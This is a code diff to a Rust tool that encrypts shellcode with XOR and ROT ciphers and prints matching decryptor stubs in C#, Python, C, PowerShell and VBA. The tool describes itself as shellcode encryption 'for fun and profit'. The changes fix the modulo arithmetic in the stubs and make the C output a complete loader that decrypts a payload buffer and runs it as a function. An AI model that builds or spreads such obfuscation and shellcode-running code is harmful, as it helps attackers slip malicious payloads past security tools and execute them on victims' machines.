@@ -1,9 +1,14 @@
 use clap::{Parser, ValueEnum};
+use clap_num::maybe_hex_range;
 use std::fs::File;
 use std::io::{self, Read};
 use std::path::PathBuf;
 //use base64::prelude::*;
 //use base85;
+
+fn key_in_range(s: &str) -> Result<u8, String> {
+    maybe_hex_range(s, 0x00, 0xff)
+}
 
 /// Shelly - Shellcode encryption for fun and profit
 #[derive(Debug, Parser)]
@@ -19,7 +24,7 @@ struct Cli {
     #[arg(short, long, default_value_t = 0)]
     rot: i8,
     /// Apply XOR cipher with the specified key value.
-    #[arg(short, long, default_value_t = 0)]
+    #[arg(short, long, value_parser=key_in_range ,default_value = "0x00")]
     xor: u8,
     /// Output format for the encrypted shellcode.
     #[clap(value_enum, short, long, default_value_t = Format::Csharp)]
@@ -53,7 +58,7 @@ fn main() -> io::Result<()> {
     let cli = Cli::parse();
     let input_path = cli.input;
     let rot_shift = cli.rot;
-    let xor_key = cli.xor;
+    let xor_key: u8 = cli.xor;
     let format = cli.format;
     let output_var = cli.var;
     //let encoding = cli.encoding;
@@ -320,41 +325,50 @@ fn print_decryption_commands(format: Format, output_var: &str, rot_key: i8, xor_
             println!("{} = ROT({},{})", output_var, output_var, rot_key);
             println!("\n// ROT function in C#:");
             println!("public static byte[] ROT(byte[] data, int shift) {{");
-            println!("    return data.Select(b => (byte)((b + shift) % 256)).ToArray();");
+            println!("    // Ensure the result is non-negative before applying % 256");
+            println!("    return data.Select(b => (byte)((b + shift + 256) % 256)).ToArray();");
             println!("}}");
         },
         Format::Python => {
             print!("### Python code to decrypt:\n");
             println!("{} = bytearray(/* payload bytes here */)", output_var);
-            println!("{} = [byte ^ {} for byte in {}]", output_var, xor_key, output_var);
+            println!("{} = [byte ^ 0x{:02x} for byte in {}]", output_var, xor_key, output_var);
             println!("{} = ROT({}, {})", output_var, output_var, rot_key);
             println!("\n# ROT function in Python:");
             println!("def ROT(data, shift):");
-            println!("    return bytearray((byte + shift) % 256 for byte in data)");
+            println!("    # Ensure the result is non-negative before applying % 256");
+            println!("    return bytearray((byte + shift + 256) % 256 for byte in data)");
         },
         Format::C => {
             print!("/* C code to decrypt: */\n");
-            println!("unsigned char {}[] = {{ /* payload bytes here */ }};", output_var);
-            println!("for (size_t i = 0; i < sizeof({}); i++) {{", output_var);
-            println!("    {}[i] ^= {}; // XOR decrypt", output_var, xor_key);
-            println!("}}");
-            println!("for (size_t i = 0; i < sizeof({}); i++) {{", output_var);
-            println!("    {}[i] = ROT({}[i], {}); // ROT decrypt", output_var, output_var, rot_key);
-            println!("}}");
-            println!("\n// ROT function in C:");
+            println!("// ROT function in C:");
             println!("unsigned char ROT(unsigned char byte, int shift) {{");
-            println!("    return (byte + shift) % 256;");
+            println!("    // Ensure the result is non-negative before applying % 256");
+            println!("    return (byte + shift + 256) % 256;");
+            println!("}}\n");
+            println!("\n// main function in C:");
+            println!("int main(int argc, char **argv) {{");
+            println!("    for (size_t i = 0; i < sizeof({}); i++) {{", output_var);
+            println!("        {}[i] ^= 0x{:02x}; // XOR decrypt", output_var, xor_key);
+            println!("    }}");
+            println!("    for (size_t i = 0; i < sizeof({}); i++) {{", output_var);
+            println!("        {}[i] = ROT({}[i], {}); // ROT decrypt", output_var, output_var, rot_key);
+            println!("    }}\n");
+            println!("    int (*ret)() = (int(*)()){};", output_var);
+            println!("    ret();");
             println!("}}");
+
         },
         Format::Psh => {
             print!("### PowerShell code to decrypt:\n");
             println!("${} = [byte[]]@(/* payload bytes here */)", output_var);
-            println!("${} = ${{}}.ToCharArray() | ForEach-Object {{ [byte]($_ -bxor {}) }}", output_var, xor_key);
+            println!("${} = ${{}}.ToCharArray() | ForEach-Object {{ [byte]($_ -bxor 0x{:02x}) }}", output_var, xor_key);
             println!("${} = ROT(${},{})", output_var, output_var, rot_key);
             println!("\n# ROT function in PowerShell:");
             println!("function ROT($data, $shift) {{");
-            println!("    $shift = $shift % 256;");
-            println!("    return $data | ForEach-Object {{ ($_ + $shift) % 256 }};");
+            //println!("    $shift = $shift % 256;");
+            println!("    # Ensure the result is non-negative before applying % 256");
+            println!("    return $data | ForEach-Object {{ ($_ + $shift +256) % 256 }};");
             println!("}}");
         },
         Format::Vba => {
@@ -370,7 +384,8 @@ fn print_decryption_commands(format: Format, output_var: &str, rot_key: i8, xor_
             println!("    Dim result() As Byte");
             println!("    ReDim result(LBound(data) To UBound(data))");
             println!("    For i = LBound(data) To UBound(data)");
-            println!("        result(i) = (data(i) + shift) Mod 256");
+            println!("        ' Ensure the result is non-negative before applying Mod 256");
+            println!("        result(i) = (data(i) + shift +256) Mod 256");
             println!("    Next i");
             println!("    ROT = result");
             println!("End Function");
